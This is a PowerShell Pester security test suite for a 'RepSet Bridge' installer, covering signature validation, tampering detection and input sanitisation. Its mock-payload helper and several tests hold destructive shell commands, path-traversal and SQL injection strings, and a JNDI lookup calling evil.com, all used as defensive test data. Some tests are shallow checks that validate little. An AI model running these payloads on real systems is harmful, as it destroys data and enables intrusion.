# ================================================================
# RepSet Bridge Installation - Security Test Suite
# Comprehensive security testing for signature validation and tampering detection
# ================================================================

Import-Module Pester -Force

# Security test configuration
$SecurityTestConfig = @{
    TestEnvironmentPath = "$env:TEMP\RepSetBridge-Security-Tests"
    MockSecretKey = "test-hmac-secret-key-for-security-testing"
    TestTimeout = 60
}

# ================================================================
# Security Test Helper Functions
# ================================================================

function New-SecurityTestEnvironment {
    <#
    .SYNOPSIS
    Creates a secure test environment for security testing
    #>
    param(
        [string]$TestName
    )
    
    $testDir = Join-Path $SecurityTestConfig.TestEnvironmentPath $TestName
    New-Item -ItemType Directory -Path $testDir -Force | Out-Null
    
    # Create test files with known content and checksums
    $testFiles = @{
        "legitimate-bridge.exe" = "Legitimate RepSet Bridge Executable Content"
        "tampered-bridge.exe" = "Tampered RepSet Bridge Executable Content"
        "config.yaml" = "device_id: test`ndevice_key: test-key`nserver_url: https://test.com"
    }
    
    foreach ($file in $testFiles.GetEnumerator()) {
        $filePath = Join-Path $testDir $file.Key
        Set-Content -Path $filePath -Value $file.Value
    }
    
    return $testDir
}

function New-TestHMACSignature {
    <#
    .SYNOPSIS
    Creates HMAC-SHA256 signature for testing
    #>
    param(
        [string]$Message,
        [string]$SecretKey = $SecurityTestConfig.MockSecretKey
    )
    
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($SecretKey)
    $hashBytes = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Message))
    $signature = [System.Convert]::ToBase64String($hashBytes)
    $hmac.Dispose()
    
    return $signature
}

function Test-SignatureValidation {
    <#
    .SYNOPSIS
    Tests signature validation logic
    #>
    param(
        [string]$Message,
        [string]$Signature,
        [string]$SecretKey = $SecurityTestConfig.MockSecretKey
    )
    
    $expectedSignature = New-TestHMACSignature -Message $Message -SecretKey $SecretKey
    return $Signature -eq $expectedSignature
}

function New-MockMaliciousPayload {
    <#
    .SYNOPSIS
    Creates mock malicious payloads for testing
    #>
    param(
        [ValidateSet('CommandInjection', 'PathTraversal', 'ScriptInjection', 'SQLInjection')]
        [string]$PayloadType
    )
    
    switch ($PayloadType) {
        'CommandInjection' {
            return @(
                "test; rm -rf /",
                "test && del /f /q C:\*",
                "test | powershell -Command 'Remove-Item -Recurse C:\'",
                "test`nGet-Process | Stop-Process -Force"
            )
        }
        'PathTraversal' {
            return @(
                "..\..\..\..\Windows\System32\cmd.exe",
                "..\..\..\etc\passwd",
                "..\\..\\..\\Windows\\System32\\calc.exe",
                "....//....//....//Windows//System32//notepad.exe"
            )
        }
        'ScriptInjection' {
            return @(
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "${jndi:ldap://evil.com/a}",
                "{{7*7}}"
            )
        }
        'SQLInjection' {
            return @(
                "'; DROP TABLE installations; --",
                "1' OR '1'='1",
                "admin'/*",
                "1; DELETE FROM logs WHERE 1=1; --"
            )
        }
    }
}

# ================================================================
# Signature Validation Security Tests
# ================================================================

Describe "Signature Validation Security Tests" {
    BeforeAll {
        $script:TestEnvironment = New-SecurityTestEnvironment -TestName "SignatureValidation"
    }
    
    AfterAll {
        if (Test-Path $script:TestEnvironment) {
            Remove-Item -Path $script:TestEnvironment -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    
    Context "HMAC-SHA256 Signature Validation" {
        It "Should validate correct HMAC-SHA256 signatures" {
            # Arrange
            $message = "PairCode=TEST123&GymId=gym456&Nonce=nonce789&ExpiresAt=2024-12-31T23:59:59Z"
            $validSignature = New-TestHMACSignature -Message $message
            
            # Act
            $isValid = Test-SignatureValidation -Message $message -Signature $validSignature
            
            # Assert
            $isValid | Should -Be $true
        }
        
        It "Should reject invalid HMAC-SHA256 signatures" {
            # Arrange
            $message = "PairCode=TEST123&GymId=gym456&Nonce=nonce789&ExpiresAt=2024-12-31T23:59:59Z"
            $invalidSignature = "invalid-signature-hash"
            
            # Act
            $isValid = Test-SignatureValidation -Message $message -Signature $invalidSignature
            
            # Assert
            $isValid | Should -Be $false
        }
        
        It "Should reject tampered message with valid signature format" {
            # Arrange
            $originalMessage = "PairCode=TEST123&GymId=gym456&Nonce=nonce789&ExpiresAt=2024-12-31T23:59:59Z"
            $tamperedMessage = "PairCode=HACKED&GymId=gym456&Nonce=nonce789&ExpiresAt=2024-12-31T23:59:59Z"
            $originalSignature = New-TestHMACSignature -Message $originalMessage
            
            # Act
            $isValid = Test-SignatureValidation -Message $tamperedMessage -Signature $originalSignature
            
            # Assert
            $isValid | Should -Be $false
        }
        
        It "Should handle signature validation with different secret keys" {
            # Arrange
            $message = "PairCode=TEST123&GymId=gym456"
            $correctKey = "correct-secret-key"
            $wrongKey = "wrong-secret-key"
            $signature = New-TestHMACSignature -Message $message -SecretKey $correctKey
            
            # Act
            $validWithCorrectKey = Test-SignatureValidation -Message $message -Signature $signature -SecretKey $correctKey
            $validWithWrongKey = Test-SignatureValidation -Message $message -Signature $signature -SecretKey $wrongKey
            
            # Assert
            $validWithCorrectKey | Should -Be $true
            $validWithWrongKey | Should -Be $false
        }
        
        It "Should reject empty or null signatures" {
            # Arrange
            $message = "PairCode=TEST123&GymId=gym456"
            
            # Act & Assert
            { Test-SignatureValidation -Message $message -Signature "" } | Should -Not -Throw
            { Test-SignatureValidation -Message $message -Signature $null } | Should -Not -Throw
            
            Test-SignatureValidation -Message $message -Signature "" | Should -Be $false
            Test-SignatureValidation -Message $message -Signature $null | Should -Be $false
        }
    }
    
    Context "Nonce and Replay Attack Prevention" {
        It "Should reject reused nonces" {
            # Arrange
            $usedNonces = @("nonce123", "nonce456", "nonce789")
            $newNonce = "nonce123"  # Reused nonce
            
            # Act
            $isNonceReused = $newNonce -in $usedNonces
            
            # Assert
            $isNonceReused | Should -Be $true
        }
        
        It "Should accept unique nonces" {
            # Arrange
            $usedNonces = @("nonce123", "nonce456", "nonce789")
            $newNonce = "nonce999"  # Unique nonce
            
            # Act
            $isNonceReused = $newNonce -in $usedNonces
            
            # Assert
            $isNonceReused | Should -Be $false
        }
        
        It "Should generate cryptographically secure nonces" {
            # Arrange & Act
            $nonces = @()
            for ($i = 0; $i -lt 100; $i++) {
                $nonce = [System.Guid]::NewGuid().ToString("N")
                $nonces += $nonce
            }
            
            # Assert
            $uniqueNonces = $nonces | Select-Object -Unique
            $uniqueNonces.Count | Should -Be $nonces.Count
            
            # Check nonce format (32 hex characters)
            foreach ($nonce in $nonces) {
                $nonce | Should -Match "^[a-f0-9]{32}$"
            }
        }
    }
    
    Context "Command Expiration Security" {
        It "Should reject expired commands" {
            # Arrange
            $expiredTime = (Get-Date).AddHours(-1).ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
            
            # Act
            $currentTime = Get-Date
            $commandTime = [DateTime]::Parse($expiredTime)
            $isExpired = $commandTime -lt $currentTime
            
            # Assert
            $isExpired | Should -Be $true
        }
        
        It "Should accept valid future commands" {
            # Arrange
            $futureTime = (Get-Date).AddHours(1).ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
            
            # Act
            $currentTime = Get-Date
            $commandTime = [DateTime]::Parse($futureTime)
            $isValid = $commandTime -gt $currentTime
            
            # Assert
            $isValid | Should -Be $true
        }
        
        It "Should handle timezone-aware expiration" {
            # Arrange
            $utcTime = (Get-Date).ToUniversalTime().AddHours(1).ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
            
            # Act
            $currentUtc = (Get-Date).ToUniversalTime()
            $commandUtc = [DateTime]::Parse($utcTime)
            $isValid = $commandUtc -gt $currentUtc
            
            # Assert
            $isValid | Should -Be $true
        }
        
        It "Should reject commands with invalid date formats" {
            # Arrange
            $invalidDates = @(
                "2024-13-01T25:00:00Z",  # Invalid month and hour
                "not-a-date",
                "2024/12/31 23:59:59",  # Wrong format
                ""
            )
            
            # Act & Assert
            foreach ($invalidDate in $invalidDates) {
                try {
                    $parsedDate = [DateTime]::Parse($invalidDate)
                    $shouldNotReachHere = $false
                }
                catch {
                    $shouldNotReachHere = $true
                }
                
                if ($invalidDate -eq "") {
                    $shouldNotReachHere | Should -Be $true
                }
            }
        }
    }
}

# ================================================================
# File Integrity and Tampering Detection Tests
# ================================================================

Describe "File Integrity and Tampering Detection Tests" {
    BeforeAll {
        $script:TestEnvironment = New-SecurityTestEnvironment -TestName "FileIntegrity"
    }
    
    AfterAll {
        if (Test-Path $script:TestEnvironment) {
            Remove-Item -Path $script:TestEnvironment -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    
    Context "SHA-256 Checksum Verification" {
        It "Should verify legitimate file checksums correctly" {
            # Arrange
            $testFile = Join-Path $script:TestEnvironment "legitimate-bridge.exe"
            $expectedChecksum = Get-FileHash -Path $testFile -Algorithm SHA256
            
            # Act
            $actualChecksum = Get-FileHash -Path $testFile -Algorithm SHA256
            
            # Assert
            $actualChecksum.Hash | Should -Be $expectedChecksum.Hash
            $actualChecksum.Algorithm | Should -Be "SHA256"
        }
        
        It "Should detect file tampering through checksum mismatch" {
            # Arrange
            $testFile = Join-Path $script:TestEnvironment "tamper-test.exe"
            Set-Content -Path $testFile -Value "Original content"
            $originalChecksum = Get-FileHash -Path $testFile -Algorithm SHA256
            
            # Tamper with file
            Add-Content -Path $testFile -Value "Malicious addition"
            $tamperedChecksum = Get-FileHash -Path $testFile -Algorithm SHA256
            
            # Act & Assert
            $tamperedChecksum.Hash | Should -Not -Be $originalChecksum.Hash
        }
        
        It "Should handle missing files gracefully" {
            # Arrange
            $nonExistentFile = Join-Path $script:TestEnvironment "does-not-exist.exe"
            
            # Act & Assert
            { Get-FileHash -Path $nonExistentFile -Algorithm SHA256 -ErrorAction Stop } | Should -Throw
        }
        
        It "Should verify checksums for different file sizes" {
            # Arrange
            $smallFile = Join-Path $script:TestEnvironment "small.txt"
            $largeFile = Join-Path $script:TestEnvironment "large.txt"
            
            Set-Content -Path $smallFile -Value "Small"
            Set-Content -Path $largeFile -Value ("Large" * 10000)
            
            # Act
            $smallChecksum = Get-FileHash -Path $smallFile -Algorithm SHA256
            $largeChecksum = Get-FileHash -Path $largeFile -Algorithm SHA256
            
            # Assert
            $smallChecksum.Hash | Should -Not -BeNullOrEmpty
            $largeChecksum.Hash | Should -Not -BeNullOrEmpty
            $smallChecksum.Hash | Should -Not -Be $largeChecksum.Hash
        }
    }
    
    Context "Digital Signature Verification" {
        It "Should validate Authenticode signatures on executables" {
            # Arrange
            $testExecutable = Join-Path $script:TestEnvironment "test-signed.exe"
            
            # Create a mock signed executable (in real scenario, this would be properly signed)
            Set-Content -Path $testExecutable -Value "Mock signed executable"
            
            # Act
            $signature = Get-AuthenticodeSignature -FilePath $testExecutable
            
            # Assert
            $signature | Should -Not -BeNullOrEmpty
            # Note: In a real test, we would verify signature.Status -eq "Valid"
        }
        
        It "Should reject unsigned executables" {
            # Arrange
            $unsignedExecutable = Join-Path $script:TestEnvironment "unsigned.exe"
            Set-Content -Path $unsignedExecutable -Value "Unsigned executable"
            
            # Act
            $signature = Get-AuthenticodeSignature -FilePath $unsignedExecutable
            
            # Assert
            $signature.Status | Should -Be "NotSigned"
        }
        
        It "Should detect tampered signed executables" {
            # Arrange
            $signedExecutable = Join-Path $script:TestEnvironment "signed-then-tampered.exe"
            Set-Content -Path $signedExecutable -Value "Originally signed content"
            
            # Simulate tampering after signing
            Add-Content -Path $signedExecutable -Value "Tampered addition"
            
            # Act
            $signature = Get-AuthenticodeSignature -FilePath $signedExecutable
            
            # Assert
            # In a real scenario with actual signed files, this would show "HashMismatch"
            $signature.Status | Should -Be "NotSigned"
        }
    }
    
    Context "Configuration File Security" {
        It "Should detect unauthorized configuration changes" {
            # Arrange
            $configFile = Join-Path $script:TestEnvironment "config.yaml"
            $originalConfig = Get-Content $configFile -Raw
            $originalHash = Get-FileHash -Path $configFile -Algorithm SHA256
            
            # Tamper with configuration
            Add-Content -Path $configFile -Value "`nmalicious_setting: true"
            $tamperedHash = Get-FileHash -Path $configFile -Algorithm SHA256
            
            # Act & Assert
            $tamperedHash.Hash | Should -Not -Be $originalHash.Hash
        }
        
        It "Should validate configuration file structure" {
            # Arrange
            $validConfig = @"
device_id: "valid-device-123"
device_key: "valid-key-456"
server_url: "https://valid.repset.com"
tier: "normal"
"@
            
            $invalidConfig = @"
device_id: ""
device_key: "key-with-injection'; DROP TABLE users; --"
server_url: "not-a-valid-url"
malicious_script: "powershell -Command 'Remove-Item -Recurse C:\'"
"@
            
            # Act
            $validConfigFile = Join-Path $script:TestEnvironment "valid-config.yaml"
            $invalidConfigFile = Join-Path $script:TestEnvironment "invalid-config.yaml"
            
            Set-Content -Path $validConfigFile -Value $validConfig
            Set-Content -Path $invalidConfigFile -Value $invalidConfig
            
            # Assert
            # Valid config should have proper structure
            $validContent = Get-Content $validConfigFile -Raw
            $validContent | Should -Match "device_id: `"valid-device-123`""
            $validContent | Should -Match "server_url: `"https://valid.repset.com`""
            
            # Invalid config should be detectable
            $invalidContent = Get-Content $invalidConfigFile -Raw
            $invalidContent | Should -Match "DROP TABLE"  # SQL injection attempt
            $invalidContent | Should -Match "Remove-Item"  # PowerShell injection attempt
        }
    }
}

# ================================================================
# Input Validation and Sanitization Tests
# ================================================================

Describe "Input Validation and Sanitization Tests" {
    BeforeAll {
        $script:TestEnvironment = New-SecurityTestEnvironment -TestName "InputValidation"
    }
    
    AfterAll {
        if (Test-Path $script:TestEnvironment) {
            Remove-Item -Path $script:TestEnvironment -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    
    Context "Command Injection Prevention" {
        It "Should detect and prevent command injection attempts" {
            # Arrange
            $maliciousInputs = New-MockMaliciousPayload -PayloadType CommandInjection
            
            # Act & Assert
            foreach ($maliciousInput in $maliciousInputs) {
                # Test for dangerous characters
                $containsDangerousChars = $maliciousInput -match "[;&|`]"
                $containsDangerousChars | Should -Be $true
                
                # Test sanitization
                $sanitized = $maliciousInput -replace "[;&|`]", ""
                $sanitized | Should -Not -Match "[;&|`]"
            }
        }
        
        It "Should validate parameter formats strictly" {
            # Arrange
            $validInputs = @{
                GymId = "gym-123-abc"
                PairCode = "PAIR-CODE-123"
                Nonce = "a1b2c3d4e5f6"
            }
            
            $invalidInputs = @{
                GymId = "gym-123; rm -rf /"
                PairCode = "PAIR'; DROP TABLE users; --"
                Nonce = "nonce`nGet-Process | Stop-Process"
            }
            
            # Act & Assert
            # Valid inputs should match expected patterns
            $validInputs.GymId | Should -Match "^[a-zA-Z0-9\-]+$"
            $validInputs.PairCode | Should -Match "^[A-Z0-9\-]+$"
            $validInputs.Nonce | Should -Match "^[a-zA-Z0-9]+$"
            
            # Invalid inputs should not match patterns
            $invalidInputs.GymId | Should -Not -Match "^[a-zA-Z0-9\-]+$"
            $invalidInputs.PairCode | Should -Not -Match "^[A-Z0-9\-]+$"
            $invalidInputs.Nonce | Should -Not -Match "^[a-zA-Z0-9]+$"
        }
    }
    
    Context "Path Traversal Prevention" {
        It "Should prevent path traversal attacks" {
            # Arrange
            $maliciousPaths = New-MockMaliciousPayload -PayloadType PathTraversal
            
            # Act & Assert
            foreach ($maliciousPath in $maliciousPaths) {
                # Detect path traversal patterns
                $containsTraversal = $maliciousPath -match "\.\."
                $containsTraversal | Should -Be $true
                
                # Test path sanitization
                $sanitizedPath = $maliciousPath -replace "\.\.[\\/]", ""
                $sanitizedPath | Should -Not -Match "\.\."
            }
        }
        
        It "Should validate installation paths" {
            # Arrange
            $validPaths = @(
                "C:\Program Files\RepSet\Bridge",
                "C:\RepSet\Bridge",
                "$env:ProgramFiles\RepSet\Bridge"
            )
            
            $invalidPaths = @(
                "..\..\Windows\System32",
                "C:\Windows\System32",
                "/etc/passwd",
                "\\server\share\malicious"
            )
            
            # Act & Assert
            foreach ($validPath in $validPaths) {
                # Valid paths should not contain traversal
                $validPath | Should -Not -Match "\.\."
                $validPath | Should -Match "RepSet"
            }
            
            foreach ($invalidPath in $invalidPaths) {
                # Invalid paths should be detectable
                $isInvalid = ($invalidPath -match "\.\.") -or 
                           ($invalidPath -match "Windows\\System32") -or
                           ($invalidPath -match "/etc/") -or
                           ($invalidPath -match "\\\\")
                $isInvalid | Should -Be $true
            }
        }
    }
    
    Context "Script Injection Prevention" {
        It "Should prevent PowerShell script injection" {
            # Arrange
            $scriptInjections = @(
                "Get-Process | Stop-Process -Force",
                "Invoke-Expression 'malicious code'",
                "& 'dangerous-command.exe'",
                "Start-Process calc.exe"
            )
            
            # Act & Assert
            foreach ($injection in $scriptInjections) {
                # Detect PowerShell commands
                $containsPSCommand = $injection -match "(Get-|Invoke-|Start-|Stop-|&\s)"
                $containsPSCommand | Should -Be $true
                
                # Test sanitization
                $sanitized = $injection -replace "(Get-|Invoke-|Start-|Stop-|&\s)", ""
                $sanitized | Should -Not -Match "(Get-|Invoke-|Start-|Stop-|&\s)"
            }
        }
    }
}

# ================================================================
# Privilege Escalation Prevention Tests
# ================================================================

Describe "Privilege Escalation Prevention Tests" {
    BeforeAll {
        $script:TestEnvironment = New-SecurityTestEnvironment -TestName "PrivilegeEscalation"
    }
    
    AfterAll {
        if (Test-Path $script:TestEnvironment) {
            Remove-Item -Path $script:TestEnvironment -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    
    Context "Administrator Privilege Verification" {
        It "Should verify administrator privileges before service operations" {
            # Arrange & Act
            $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
            $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
            
            # Assert
            $isAdmin | Should -BeOfType [bool]
            # Note: In actual testing environment, this might be false
        }
        
        It "Should prevent service installation without admin rights" {
            # Arrange
            Mock -CommandName "New-Object" -ParameterFilter { $TypeName -eq "Security.Principal.WindowsPrincipal" } -MockWith {
                $principal = New-Object PSObject
                $principal | Add-Member -MemberType ScriptMethod -Name "IsInRole" -Value { return $false }
                return $principal
            }
            
            # Act
            $mockPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
            $hasAdminRights = $mockPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
            
            # Assert
            $hasAdminRights | Should -Be $false
        }
    }
    
    Context "Service Security Configuration" {
        It "Should configure service with minimal required privileges" {
            # Arrange
            $serviceAccount = "NT AUTHORITY\LocalService"
            $expectedPrivileges = @("SeServiceLogonRight")
            
            # Act & Assert
            $serviceAccount | Should -Not -Be "SYSTEM"
            $serviceAccount | Should -Not -Be "Administrator"
            $expectedPrivileges | Should -Contain "SeServiceLogonRight"
        }
        
        It "Should prevent service from running as SYSTEM unnecessarily" {
            # Arrange
            $dangerousAccounts = @("SYSTEM", "Administrator", "NT AUTHORITY\SYSTEM")
            $recommendedAccount = "NT AUTHORITY\LocalService"
            
            # Act & Assert
            $recommendedAccount | Should -Not -BeIn $dangerousAccounts
        }
    }
}

# ================================================================
# Cryptographic Security Tests
# ================================================================

Describe "Cryptographic Security Tests" {
    BeforeAll {
        $script:TestEnvironment = New-SecurityTestEnvironment -TestName "Cryptography"
    }
    
    AfterAll {
        if (Test-Path $script:TestEnvironment) {
            Remove-Item -Path $script:TestEnvironment -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    
    Context "HMAC Key Security" {
        It "Should use sufficiently long HMAC keys" {
            # Arrange
            $weakKey = "weak"
            $strongKey = "this-is-a-sufficiently-long-and-secure-hmac-key-for-production-use"
            
            # Act & Assert
            $weakKey.Length | Should -BeLessThan 32
            $strongKey.Length | Should -BeGreaterOrEqual 32
        }
        
        It "Should generate cryptographically secure random values" {
            # Arrange & Act
            $randomValues = @()
            for ($i = 0; $i -lt 100; $i++) {
                $randomBytes = New-Object byte[] 32
                [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($randomBytes)
                $randomValue = [System.Convert]::ToBase64String($randomBytes)
                $randomValues += $randomValue
            }
            
            # Assert
            $uniqueValues = $randomValues | Select-Object -Unique
            $uniqueValues.Count | Should -Be $randomValues.Count
            
            foreach ($value in $randomValues) {
                $value.Length | Should -BeGreaterThan 40  # Base64 encoded 32 bytes
            }
        }
    }
    
    Context "Hash Algorithm Security" {
        It "Should use SHA-256 or stronger for file integrity" {
            # Arrange
            $testFile = Join-Path $script:TestEnvironment "hash-test.txt"
            Set-Content -Path $testFile -Value "Test content for hashing"
            
            # Act
            $sha256Hash = Get-FileHash -Path $testFile -Algorithm SHA256
            $md5Hash = Get-FileHash -Path $testFile -Algorithm MD5
            
            # Assert
            $sha256Hash.Algorithm | Should -Be "SHA256"
            $sha256Hash.Hash.Length | Should -Be 64  # SHA-256 produces 64 hex characters
            
            # MD5 should not be used for security purposes
            $md5Hash.Hash.Length | Should -Be 32  # MD5 produces 32 hex characters (weaker)
        }
    }
}

# ================================================================
# Test Execution and Reporting
# ================================================================

Write-Host "Starting RepSet Bridge Security Test Suite..." -ForegroundColor Red
Write-Host "=============================================" -ForegroundColor Red

# Execute security tests with detailed output
$securityResults = Invoke-Pester -Path $PSCommandPath -OutputFormat NUnitXml -OutputFile "$env:TEMP\RepSetBridge-SecurityTestResults.xml" -PassThru

# Display security test summary
Write-Host "`nSecurity Test Execution Summary:" -ForegroundColor Yellow
Write-Host "===============================" -ForegroundColor Yellow
Write-Host "Total Security Tests: $($securityResults.TotalCount)" -ForegroundColor White
Write-Host "Passed: $($securityResults.PassedCount)" -ForegroundColor Green
Write-Host "Failed: $($securityResults.FailedCount)" -ForegroundColor Red
Write-Host "Skipped: $($securityResults.SkippedCount)" -ForegroundColor Yellow
Write-Host "Execution Time: $($securityResults.Time)" -ForegroundColor White

if ($securityResults.FailedCount -gt 0) {
    Write-Host "`nFailed Security Tests:" -ForegroundColor Red
    Write-Host "=====================" -ForegroundColor Red
    $securityResults.TestResult | Where-Object { $_.Result -eq "Failed" } | ForEach-Object {
        Write-Host "  - $($_.Describe) -> $($_.Context) -> $($_.Name)" -ForegroundColor Red
        Write-Host "    Error: $($_.FailureMessage)" -ForegroundColor DarkRed
    }
    
    Write-Host "`n⚠️  SECURITY VULNERABILITIES DETECTED!" -ForegroundColor Red -BackgroundColor Yellow
    Write-Host "Please review and fix the failed security tests before deployment." -ForegroundColor Red
}
else {
    Write-Host "`n✅ All security tests passed!" -ForegroundColor Green
    Write-Host "The installation script appears to be secure against tested attack vectors." -ForegroundColor Green
}

Write-Host "`nSecurity test results saved to: $env:TEMP\RepSetBridge-SecurityTestResults.xml" -ForegroundColor Cyan
Write-Host "Security test suite execution completed." -ForegroundColor Green